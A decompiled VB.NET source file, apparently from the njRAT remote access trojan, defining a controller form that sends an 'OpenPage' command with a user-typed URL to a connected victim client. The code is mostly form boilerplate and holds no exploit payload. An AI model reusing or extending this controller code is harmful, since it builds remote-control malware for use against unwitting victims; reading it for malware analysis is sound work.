Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200001E RID: 30
	<DesignerGenerated()>
	Public Partial Class Pro
		Inherits Form

		' Token: 0x0600041E RID: 1054 RVA: 0x0000330E File Offset: 0x0000150E
		<DebuggerNonUserCode()>
		Public Sub New()
			Pro.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600041F RID: 1055 RVA: 0x00022C24 File Offset: 0x00020E24
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Pro.__ENCList
			SyncLock _ENCList
				If Pro.__ENCList.Count = Pro.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Pro.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Pro.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Pro.__ENCList(num) = Pro.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Pro.__ENCList.RemoveRange(num, Pro.__ENCList.Count - num)
					Pro.__ENCList.Capacity = Pro.__ENCList.Count
				End If
				Pro.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000176 RID: 374
		' (get) Token: 0x06000422 RID: 1058 RVA: 0x00022F78 File Offset: 0x00021178
		' (set) Token: 0x06000423 RID: 1059 RVA: 0x00022F90 File Offset: 0x00021190
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000177 RID: 375
		' (get) Token: 0x06000424 RID: 1060 RVA: 0x00022FE8 File Offset: 0x000211E8
		' (set) Token: 0x06000425 RID: 1061 RVA: 0x00003322 File Offset: 0x00001522
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x17000178 RID: 376
		' (get) Token: 0x06000426 RID: 1062 RVA: 0x00023000 File Offset: 0x00021200
		' (set) Token: 0x06000427 RID: 1063 RVA: 0x0000332B File Offset: 0x0000152B
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x06000428 RID: 1064 RVA: 0x00023018 File Offset: 0x00021218
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim text As String = Me.TextBox1.Text
			Me.s.Send("OpenPage" + Class7.string_1 + text)
		End Sub

		' Token: 0x040001EB RID: 491
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001ED RID: 493
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x040001EE RID: 494
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x040001EF RID: 495
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x040001F0 RID: 496
		Public s As Client
	End Class
End Namespace
